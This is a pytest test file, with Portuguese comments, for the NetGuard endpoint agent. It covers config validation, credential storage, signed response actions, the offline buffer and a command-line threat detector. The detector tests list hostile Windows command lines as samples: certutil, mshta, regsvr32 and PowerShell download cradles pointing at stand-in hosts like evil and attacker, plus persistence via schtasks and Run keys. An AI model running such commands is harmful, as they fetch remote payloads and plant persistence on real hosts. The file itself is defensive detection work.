"""
T18 — Tests para o novo /agent (endpoint agent + agent.exe).

Cobre:
  - host_identity: persiste o host_id entre chamadas
  - config: defaults seguros, env override, validate()
  - collector: detecta padrões de segurança no command line
  - sender: buffer offline funciona quando POST falha
  - schema: events produzidos pelo agente passam por
            EndpointEvent.from_payload sem ValueError
"""

from __future__ import annotations

import os
import re
import sys
import time
import uuid
from pathlib import Path
from unittest.mock import patch

import pytest

# Garante que o repo root está no sys.path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


# ──────────────────────────────────────────────────────────────────
# host_identity
# ──────────────────────────────────────────────────────────────────


def test_host_id_is_uuid_and_persistent(tmp_path, monkeypatch):
    monkeypatch.setenv("NETGUARD_AGENT_HOME", str(tmp_path))

    # Re-importa pra garantir que pegou env nova.
    import importlib

    from agent import host_identity
    importlib.reload(host_identity)

    h1 = host_identity.get_host_id()
    h2 = host_identity.get_host_id()
    assert h1 == h2, "host_id deve ser estável entre chamadas"
    # UUID v4 (ou v1) — qualquer um casa com este regex
    assert re.match(r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$", h1, re.I), \
        f"host_id não é UUID válido: {h1!r}"

    # Persistência: arquivo deve existir.
    assert (tmp_path / "host_id").exists()


def test_host_id_recovers_corrupted_file(tmp_path, monkeypatch):
    """Se o arquivo de host_id estiver corrompido, regenera em vez de crashar."""
    monkeypatch.setenv("NETGUARD_AGENT_HOME", str(tmp_path))
    (tmp_path / "host_id").write_text("not-a-valid-uuid", encoding="utf-8")

    import importlib

    from agent import host_identity
    importlib.reload(host_identity)
    h = host_identity.get_host_id()
    assert re.match(r"^[0-9a-f]{8}-", h, re.I), "Deve gerar UUID novo"


def test_host_facts_returns_required_fields():
    from agent.host_identity import get_host_facts

    facts = get_host_facts()
    for required in (
        "hostname",
        "platform",
        "user",
        "machine",
        "local_ip",
        "mac_address",
        "default_gateway",
        "default_gateway_mac",
        "network_interfaces",
    ):
        assert required in facts, f"host_facts sem {required!r}"
    assert isinstance(facts["network_interfaces"], list)


# ──────────────────────────────────────────────────────────────────
# config
# ──────────────────────────────────────────────────────────────────


def test_config_validate_rejects_change_me(tmp_path):
    from agent.config import AgentConfig

    cfg = AgentConfig(api_key="CHANGE_ME")
    with pytest.raises(ValueError, match="api_key"):
        cfg.validate()


def test_config_validate_rejects_short_interval():
    from agent.config import AgentConfig

    cfg = AgentConfig(api_key="nga_real_key", interval_seconds=1)
    with pytest.raises(ValueError, match="interval_seconds"):
        cfg.validate()


def test_config_rejects_plain_http_outside_local_or_lab(monkeypatch):
    from agent.config import AgentConfig

    monkeypatch.setenv("NETGUARD_AGENT_ENV", "production")
    monkeypatch.delenv("NETGUARD_AGENT_ALLOW_INSECURE_TRANSPORT", raising=False)

    cfg = AgentConfig(
        server_url="http://soc.example.com/api/events",
        api_key="nga_real_key",
        interval_seconds=5,
    )
    with pytest.raises(ValueError, match="HTTP recusado"):
        cfg.validate()


def test_config_allows_plain_http_for_loopback_demo(monkeypatch):
    from agent.config import AgentConfig

    monkeypatch.setenv("NETGUARD_AGENT_ENV", "production")
    cfg = AgentConfig(
        server_url="http://127.0.0.1:5000/api/events",
        api_key="nga_real_key",
        interval_seconds=5,
        verify_tls=False,
    )

    cfg.validate()


def test_config_rejects_disabled_tls_outside_lab(monkeypatch):
    from agent.config import AgentConfig

    monkeypatch.setenv("NETGUARD_AGENT_ENV", "production")
    monkeypatch.delenv("NETGUARD_AGENT_ALLOW_INSECURE_TRANSPORT", raising=False)

    cfg = AgentConfig(
        server_url="https://soc.example.com/api/events",
        api_key="nga_real_key",
        interval_seconds=5,
        verify_tls=False,
    )
    with pytest.raises(ValueError, match="verify_tls=false"):
        cfg.validate()


def test_config_insecure_transport_requires_explicit_lab_override(monkeypatch):
    from agent.config import AgentConfig

    monkeypatch.setenv("NETGUARD_AGENT_ENV", "production")
    monkeypatch.setenv("NETGUARD_AGENT_ALLOW_INSECURE_TRANSPORT", "true")

    cfg = AgentConfig(
        server_url="http://soc.lab.example/api/events",
        api_key="nga_real_key",
        interval_seconds=5,
    )
    cfg.validate()


def test_config_rejects_destructive_actions_without_policy_secret(monkeypatch):
    from agent.config import AgentConfig

    monkeypatch.setenv("NETGUARD_AGENT_ENV", "production")
    cfg = AgentConfig(
        server_url="http://127.0.0.1:5000/api/events",
        api_key="nga_real_key",
        interval_seconds=5,
        verify_tls=False,
        allow_destructive_response_actions=True,
    )

    with pytest.raises(ValueError, match="response_policy_secret"):
        cfg.validate()


def test_config_response_policy_secret_env_override(tmp_path, monkeypatch):
    cfg_file = tmp_path / "config.yaml"
    cfg_file.write_text(
        'server_url: "http://127.0.0.1:5000/api/events"\n'
        'api_key: "nga_real_key"\n'
        'response_policy_secret: "file-policy-secret-should-not-win"\n',
        encoding="utf-8",
    )
    monkeypatch.setenv(
        "NETGUARD_AGENT_RESPONSE_POLICY_SECRET",
        "env-policy-secret-" + ("x" * 32),
    )

    from agent.config import load_config

    cfg = load_config(path=str(cfg_file))
    assert cfg.response_policy_secret.startswith("env-policy-secret-")


def test_config_env_override_wins(tmp_path, monkeypatch):
    """Env vars sobrescrevem o arquivo."""
    cfg_file = tmp_path / "config.yaml"
    cfg_file.write_text(
        'server_url: "http://from-file/api/events"\n'
        'api_key: "from-file"\n'
        'interval_seconds: 30\n',
        encoding="utf-8",
    )
    monkeypatch.setenv("NETGUARD_AGENT_API_KEY", "from-env")
    monkeypatch.setenv("NETGUARD_AGENT_INTERVAL_SECONDS", "60")

    from agent.config import load_config

    cfg = load_config(path=str(cfg_file))
    assert cfg.api_key == "from-env"
    assert cfg.interval_seconds == 60
    # server_url não foi sobrescrito por env, então mantém o do file
    assert "from-file" in cfg.server_url


def test_config_env_path_wins_when_service_cwd_differs(tmp_path, monkeypatch):
    cfg_file = tmp_path / "service-config.yaml"
    cfg_file.write_text(
        '{"server_url":"http://service-config/api/events","api_key":"nga_service_key"}',
        encoding="utf-8",
    )
    monkeypatch.setenv("NETGUARD_AGENT_CONFIG", str(cfg_file))
    monkeypatch.chdir(tmp_path.parent)

    from agent.config import load_config

    cfg = load_config()
    assert cfg.server_url == "http://service-config/api/events"
    assert cfg.api_key == "nga_service_key"


def test_config_finds_file_next_to_frozen_executable(tmp_path, monkeypatch):
    exe_dir = tmp_path / "installed-agent"
    exe_dir.mkdir()
    (exe_dir / "config.yaml").write_text(
        '{"server_url":"http://frozen-exe/api/events","api_key":"nga_frozen_key"}',
        encoding="utf-8",
    )
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(sys, "executable", str(exe_dir / "agent.exe"))

    from agent.config import load_config

    cfg = load_config()
    assert cfg.server_url == "http://frozen-exe/api/events"
    assert cfg.api_key == "nga_frozen_key"


def test_windows_service_install_scripts_are_packaged():
    root = Path(__file__).resolve().parents[1]
    install_script = root / "agent" / "install_agent.ps1"
    uninstall_script = root / "agent" / "uninstall_agent.ps1"

    install_text = install_script.read_text(encoding="utf-8")
    uninstall_text = uninstall_script.read_text(encoding="utf-8")

    assert "Assert-Admin" in install_text
    assert "NETGUARD_AGENT_CONFIG" in install_text
    assert "NETGUARD_AGENT_HOME" in install_text
    assert "--service install" in install_text
    assert "icacls" in install_text
    assert "--service remove" in uninstall_text
    assert "SetEnvironmentVariable" in uninstall_text


def test_linux_systemd_install_scripts_are_packaged():
    root = Path(__file__).resolve().parents[1]
    install_script = root / "agent" / "install_agent.sh"
    uninstall_script = root / "agent" / "uninstall_agent.sh"

    install_text = install_script.read_text(encoding="utf-8")
    uninstall_text = uninstall_script.read_text(encoding="utf-8")

    assert "netguard-agent" in install_text
    assert "/etc/systemd/system" in install_text
    assert "NETGUARD_AGENT_CONFIG" in install_text
    assert "NETGUARD_AGENT_HOME" in install_text
    assert "ExecStart=${PYTHON_BIN} -m agent --config" in install_text
    assert "NoNewPrivileges=true" in install_text
    assert "ProtectSystem=full" in install_text
    assert "ReadWritePaths=${STATE_DIR} ${LOG_DIR}" in install_text
    assert "systemctl daemon-reload" in uninstall_text
    assert "--keep-state" in uninstall_text
    assert "--keep-config" in uninstall_text


def test_credential_store_roundtrip_without_plaintext(tmp_path, monkeypatch):
    monkeypatch.setenv("NETGUARD_AGENT_DISABLE_DPAPI", "true")

    from agent.credentials import CredentialStore

    secret = "nga_TEST_SECRET_must_not_be_plaintext_1234567890"
    store = CredentialStore(tmp_path / "credentials.json")
    store.save(api_key=secret, host_id="host-1")

    raw = (tmp_path / "credentials.json").read_text(encoding="utf-8")
    assert secret not in raw
    loaded = store.load()
    assert loaded.api_key == secret
    assert loaded.host_id == "host-1"
    assert loaded.protection in {"file", "dpapi"}


def test_agent_setup_loads_api_key_from_credential_store(tmp_path, monkeypatch):
    monkeypatch.setenv("NETGUARD_AGENT_HOME", str(tmp_path / "state"))
    monkeypatch.setenv("NETGUARD_AGENT_DISABLE_DPAPI", "true")

    from agent.agent import NetGuardAgent
    from agent.config import AgentConfig
    from agent.credentials import CredentialStore

    secret = "nga_STORED_AGENT_KEY_for_service_restart_1234567890"
    credential_path = tmp_path / "credentials.json"
    CredentialStore(credential_path).save(api_key=secret, host_id="saved-host")

    cfg = AgentConfig(
        server_url="http://127.0.0.1:5000/api/events",
        api_key="CHANGE_ME",
        interval_seconds=5,
        verify_tls=False,
        log_path=str(tmp_path / "agent.log"),
        credential_path=str(credential_path),
    )
    agent = NetGuardAgent(config=cfg)
    agent.setup()

    assert agent.config.api_key == secret
    assert agent.sender is not None
    assert agent.sender.api_key == secret
    diagnostics = agent._runtime_diagnostics()
    assert diagnostics["runtime"]["agent_version"]
    assert diagnostics["buffer"]["pending"] == 0
    assert diagnostics["collection"]["interval_seconds"] == 5
    assert diagnostics["response_actions"]["destructive_enabled"] is False


def test_action_url_derivation():
    from agent.actions import derive_actions_url

    assert (
        derive_actions_url("https://soc.example.com/api/events")
        == "https://soc.example.com/api/agent/actions"
    )
    assert (
        derive_actions_url("http://127.0.0.1:5000/api/agent/events")
        == "http://127.0.0.1:5000/api/agent/actions"
    )


def test_action_executor_collects_diagnostics_and_refuses_destructive(tmp_path):
    from agent.actions import AgentActionExecutor
    from agent.sender import EventSender
    from server.response_policy import sign_response_policy

    sender = EventSender(
        server_url="http://agent:secret@127.0.0.1:5000/api/events?token=secret",
        api_key="nga_test",
        verify_tls=False,
        buffer_path=tmp_path / "buf.db",
    )
    executor = AgentActionExecutor(
        host_id="host-1",
        host_facts={
            "hostname": "WIN-01",
            "platform": "windows",
            "platform_version": "10.0",
            "user": "SYSTEM",
        },
        sender=sender,
        diagnostics_provider=lambda: {
            "runtime": {"agent_version": "1.0.0-test", "uptime_seconds": 42},
            "collection": {"processes": True, "connections": False},
        },
    )

    diagnostics = executor.execute({"action_type": "collect_diagnostics"})
    assert diagnostics.status == "succeeded"
    assert diagnostics.result["host_id"] == "host-1"
    assert diagnostics.result["buffer_pending"] == 0
    assert diagnostics.result["platform_version"] == "10.0"
    assert diagnostics.result["runtime"]["uptime_seconds"] == 42
    assert diagnostics.result["collection"]["connections"] is False
    assert diagnostics.result["transport"]["server_url"] == "http://127.0.0.1:5000/api/events"
    assert "secret" not in str(diagnostics.result)

    refused = executor.execute({"action_type": "isolate_host"})
    assert refused.status == "refused"
    assert refused.result["error"] == "destructive_actions_disabled"

    guarded = AgentActionExecutor(
        host_id="host-1",
        host_facts={"hostname": "WIN-01", "platform": "windows", "user": "SYSTEM"},
        sender=sender,
        allow_destructive=True,
        response_policy_secret="agent-policy-secret-" + ("x" * 32),
    )
    missing_policy = guarded.execute({
        "action_type": "isolate_host",
        "host_id": "host-1",
        "tenant_id": "default",
        "payload": {},
    })
    assert missing_policy.status == "refused"
    assert missing_policy.result["error"] == "missing_response_policy"

    secret = "agent-policy-secret-" + ("x" * 32)
    expires_at = int(time.time()) + 120
    nonce = uuid.uuid4().hex
    signature = sign_response_policy(
        secret,
        tenant_id="default",
        host_id="host-1",
        action_type="isolate_host",
        nonce=nonce,
        expires_at=expires_at,
    )
    verified = AgentActionExecutor(
        host_id="host-1",
        host_facts={"hostname": "WIN-01", "platform": "windows", "user": "SYSTEM"},
        sender=sender,
        allow_destructive=True,
        response_policy_secret=secret,
    ).execute({
        "action_type": "isolate_host",
        "host_id": "host-1",
        "tenant_id": "default",
        "payload": {
            "policy": {
                "tenant_id": "default",
                "host_id": "host-1",
                "action_type": "isolate_host",
                "nonce": nonce,
                "expires_at": expires_at,
                "signature": signature,
            },
        },
    })
    assert verified.status == "failed"
    assert verified.result["error"] == "destructive_action_not_implemented"
    assert verified.result["policy_verified"] is True


def test_agent_poll_and_execute_actions_with_fake_client(tmp_path):
    from agent.actions import ActionExecutionResult
    from agent.agent import NetGuardAgent
    from agent.config import AgentConfig

    class FakeClient:
        def __init__(self):
            self.acked = []

        def poll(self, *, limit=10, lease_seconds=120):
            return [{"action_id": "act_test", "action_type": "ping"}]

        def ack(self, action_id, *, status, result):
            self.acked.append((action_id, status, result))
            return True

    class FakeExecutor:
        def execute(self, action):
            return ActionExecutionResult("succeeded", {"message": "pong"})

    cfg = AgentConfig(
        server_url="http://127.0.0.1:5000/api/events",
        api_key="nga_test",
        interval_seconds=5,
        action_poll_interval_seconds=10,
        verify_tls=False,
        log_path=str(tmp_path / "agent.log"),
    )
    agent = NetGuardAgent(config=cfg)
    fake_client = FakeClient()
    agent.action_client = fake_client
    agent.action_executor = FakeExecutor()

    assert agent._poll_and_execute_actions() == 1
    assert fake_client.acked == [("act_test", "succeeded", {"message": "pong"})]


# ──────────────────────────────────────────────────────────────────
# collector
# ──────────────────────────────────────────────────────────────────


@pytest.mark.parametrize("cmdline,expect_event_type", [
    ("powershell.exe -enc JABzAD0AJwBoAGUAbABsAG8AJwA=", "script_execution"),
    ("powershell -EncodedCommand SQBlAFgA", "script_execution"),
    ("powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://x')\"", "script_execution"),
    ("certutil.exe -urlcache -split -f http://evil/payload.exe", "script_execution"),
    ("certutil -decode encoded.txt out.bin", "script_execution"),
    ("mshta.exe javascript:alert(1)", "script_execution"),
    ("mshta http://attacker/payload.hta", "script_execution"),
    ("rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write()", "script_execution"),
    ("regsvr32 /s /u /i:http://evil/file.sct scrobj.dll", "script_execution"),
    ("schtasks /create /sc DAILY /tn evil /tr cmd.exe", "persistence_indicator"),
    ("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d C:\\evil.exe", "persistence_indicator"),
])
def test_collector_security_patterns_detect(cmdline, expect_event_type):
    from agent.collector import _scan_command_line

    hits = _scan_command_line(cmdline)
    assert hits, f"Nenhum hit pra: {cmdline!r}"
    types = {h["event_type"] for h in hits}
    assert expect_event_type in types, \
        f"Esperado event_type={expect_event_type}, obtido={types} pra {cmdline!r}"


def test_collector_security_patterns_ignore_benign():
    from agent.collector import _scan_command_line

    benign = [
        "C:\\Windows\\System32\\notepad.exe document.txt",
        "python script.py --verbose",
        "/usr/bin/firefox https://google.com",
        "powershell -Command Get-Process",  # sem -enc nem download
    ]
    for c in benign:
        hits = _scan_command_line(c)
        assert not hits, f"Falso positivo pra: {c!r} → {hits}"


def test_collector_emits_schema_compatible_events():
    """Eventos do collector devem passar EndpointEvent.from_payload."""
    from xdr.schema import EndpointEvent

    from agent.collector import TelemetryCollector

    c = TelemetryCollector(
        host_id="test-host-xyz",
        host_facts={"platform": "linux", "hostname": "test"},
        agent_version="1.0.0",
    )
    # Força uma security event via builder direto
    ev = c._build_security_event(
        pid=1234, ppid=1, name="powershell.exe",
        cmdline="powershell.exe -enc ABCD",
        parent_name="cmd.exe", username="alice",
        event_type="script_execution",
        severity="high",
        mitre_tactic="Defense Evasion",
        mitre_technique="T1027",
        summary="Test",
        match_pattern="(?i)\\bpowershell.*-enc",
    )
    # Server consegue parsear?
    parsed = EndpointEvent.from_payload(ev)
    assert parsed.host_id == "test-host-xyz"
    assert parsed.event_type == "script_execution"
    assert parsed.severity == "high"
    assert parsed.process_name == "powershell.exe"


def test_collector_emits_canonical_fields():
    from agent.collector import TelemetryCollector

    c = TelemetryCollector(
        host_id="test-host-xyz",
        host_facts={"platform": "windows", "hostname": "WIN-01"},
        agent_version="1.0.0",
    )
    ev = c._build_security_event(
        pid=1234, ppid=1, name="powershell.exe",
        cmdline="powershell.exe -enc ABCD",
        parent_name="cmd.exe", username="alice",
        event_type="script_execution",
        severity="high",
        mitre_tactic="Defense Evasion",
        mitre_technique="T1027",
        summary="Encoded PowerShell",
        match_pattern="(?i)\\bpowershell.*-enc",
    )
    assert ev["host_id"] == "test-host-xyz"
    assert ev["hostname"] == "WIN-01"
    assert ev["agent_version"] == "1.0.0"
    assert ev["confidence"] == 95
    assert ev["user"] == "alice"
    assert ev["evidence"] == "Encoded PowerShell"
    assert ev["raw"]["matched_pattern"]


def test_collector_first_run_is_baseline():
    """Primeiro collect_events não deve flooar com process_execution dos PIDs vivos."""
    from agent.collector import TelemetryCollector

    c = TelemetryCollector(
        host_id="t",
        host_facts={"platform": "linux", "hostname": "t"},
        agent_version="1.0.0",
        collect_security=False,  # foco no comportamento de baseline
    )
    evs = c.collect_events()
    # Filtra os process_execution (excluímos behavioral_anomaly + network)
    procs = [e for e in evs if e.get("event_type") == "process_execution"]
    assert procs == [], \
        f"Primeiro run não deve emitir process_execution; obteve {len(procs)}"


# ──────────────────────────────────────────────────────────────────
# sender + buffer offline
# ──────────────────────────────────────────────────────────────────


def test_offline_buffer_persists_and_acks(tmp_path):
    from agent.sender import OfflineBuffer

    buf = OfflineBuffer(tmp_path / "buf.db", max_events=100)
    assert buf.size() == 0

    buf.push({"events": [{"id": 1}]})
    buf.push({"events": [{"id": 2}]})
    assert buf.size() == 2

    batch = buf.pop_batch(max_items=1)
    assert len(batch) == 1
    rid, payload = batch[0]
    assert payload == {"events": [{"id": 1}]}, "FIFO esperado"

    buf.ack([rid])
    assert buf.size() == 1


def test_offline_buffer_rotates_when_capacity_exceeded(tmp_path):
    from agent.sender import OfflineBuffer

    buf = OfflineBuffer(tmp_path / "buf.db", max_events=100)
    for i in range(150):
        buf.push({"events": [{"i": i}]})
    # Cap é 100 → drop dos 50 mais antigos
    assert buf.size() == 100, f"size={buf.size()}, esperado 100"
    # Primeiro evento agora deve ser o de índice 50 (FIFO drop)
    rid, payload = buf.pop_batch(max_items=1)[0]
    assert payload["events"][0]["i"] == 50


def test_sender_buffers_when_post_fails(tmp_path):
    from agent.sender import EventSender

    s = EventSender(
        server_url="http://127.0.0.1:1/api/events",  # porta nope
        api_key="nga_test",
        verify_tls=False,
        buffer_path=tmp_path / "buf.db",
    )
    # Mocka _post pra forçar falha sem fazer rede.
    with patch.object(s, "_post", return_value=(False, "boom")):
        ok = s.send_batch({"events": [{"x": 1}]})
    assert ok is False
    assert s.buffer.size() == 1


def test_sender_drains_buffer_when_post_succeeds(tmp_path):
    from agent.sender import EventSender

    s = EventSender(
        server_url="http://127.0.0.1:1/api/events",
        api_key="nga_test",
        verify_tls=False,
        buffer_path=tmp_path / "buf.db",
    )
    # Pré-popula buffer
    for i in range(3):
        s.buffer.push({"events": [{"i": i}]})
    assert s.buffer.size() == 3

    with patch.object(s, "_post", return_value=(True, "ok 200")):
        n = s.drain_once(max_batches=10)
    assert n == 3
    assert s.buffer.size() == 0


def test_sender_drain_stops_on_first_failure(tmp_path):
    """Drain interrompido quando server volta a falhar (não loop infinito)."""
    from agent.sender import EventSender

    s = EventSender(
        server_url="http://127.0.0.1:1/api/events",
        api_key="nga_test",
        verify_tls=False,
        buffer_path=tmp_path / "buf.db",
    )
    for i in range(5):
        s.buffer.push({"events": [{"i": i}]})

    # Primeiros 2 OK, 3º falha → drain para
    responses = iter([(True, "ok"), (True, "ok"), (False, "boom")])
    with patch.object(s, "_post", side_effect=lambda payload: next(responses)):
        n = s.drain_once(max_batches=10)
    assert n == 2
    assert s.buffer.size() == 3


def test_sender_does_not_log_full_api_key(tmp_path, caplog):
    """API key não pode aparecer inteira em log."""
    from agent.sender import _mask_key

    secret = "nga_VERYSECRETkey_must_not_leak_1234567890"
    masked = _mask_key(secret)
    assert secret not in masked
    assert masked.startswith(secret[:8])
    assert "..." in masked


def test_sender_posts_empty_presence_batch(tmp_path):
    from agent.sender import EventSender

    s = EventSender(
        server_url="http://127.0.0.1:1/api/events",
        api_key="nga_test",
        verify_tls=False,
        buffer_path=tmp_path / "buf.db",
    )
    with patch.object(s, "_post", return_value=(True, "ok")) as mocked:
        ok = s.send_batch({"host_id": "h1", "events": []}, buffer_on_failure=False)
    assert ok is True
    mocked.assert_called_once()
    assert s.buffer.size() == 0


def test_sender_does_not_buffer_non_retryable_4xx(tmp_path):
    from agent.sender import EventSender

    s = EventSender(
        server_url="http://127.0.0.1:1/api/events",
        api_key="nga_test",
        verify_tls=False,
        buffer_path=tmp_path / "buf.db",
    )
    with patch.object(s, "_post", return_value=(False, "http 403: invalid_api_key")):
        ok = s.send_batch({"host_id": "h1", "events": [{"x": 1}]})
    assert ok is False
    assert s.buffer.size() == 0


# ──────────────────────────────────────────────────────────────────
# Schema integration: envelope passa pelo normalizador do servidor
# ──────────────────────────────────────────────────────────────────


def test_envelope_passes_server_normalizer(tmp_path, monkeypatch):
    """
    Envelope que NetGuardAgent gera deve passar pelo
    _normalize_agent_event_payload + EndpointEvent.from_payload.
    Regressão pra qualquer dessincronização de schema agent ↔ server.
    """
    monkeypatch.setenv("NETGUARD_AGENT_HOME", str(tmp_path))
    monkeypatch.setenv("NETGUARD_AGENT_API_KEY", "nga_test_key_for_validate")
    monkeypatch.setenv("NETGUARD_AGENT_SERVER_URL", "http://127.0.0.1:5000/api/events")
    monkeypatch.setenv("NETGUARD_AGENT_VERIFY_TLS", "false")

    import importlib

    from agent import config as cfg_mod
    from agent import host_identity
    importlib.reload(host_identity)
    importlib.reload(cfg_mod)

    from agent.agent import NetGuardAgent

    a = NetGuardAgent()
    a.setup()
    # Gera 1 evento sintético (security)
    assert a.collector
    sec = a.collector._build_security_event(
        pid=1, ppid=0, name="powershell.exe",
        cmdline="powershell.exe -enc abc",
        parent_name="cmd.exe", username="bob",
        event_type="script_execution", severity="high",
        mitre_tactic="Defense Evasion", mitre_technique="T1027",
        summary="t", match_pattern="x",
    )
    envelope = a._build_envelope([sec])

    # Server-side: roda o normalizador real
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from xdr.schema import EndpointEvent

    # Mimic _normalize_agent_event_payload(envelope, host_id, platform):
    # adiciona host_id/source/platform default em cada item.
    for item in envelope["events"]:
        item.setdefault("host_id", envelope["host_id"])
        item.setdefault("source", "agent")
        item.setdefault("platform", envelope.get("platform", ""))
        # Não deve lançar:
        EndpointEvent.from_payload(item)


def test_agent_main_dispatches_service_command(monkeypatch):
    from agent import agent as agent_mod

    monkeypatch.setattr(sys, "argv", ["agent.exe", "--service", "install"])
    with patch("agent.service.main", return_value=7) as mocked:
        assert agent_mod.main() == 7
    mocked.assert_called_once_with(["install"])
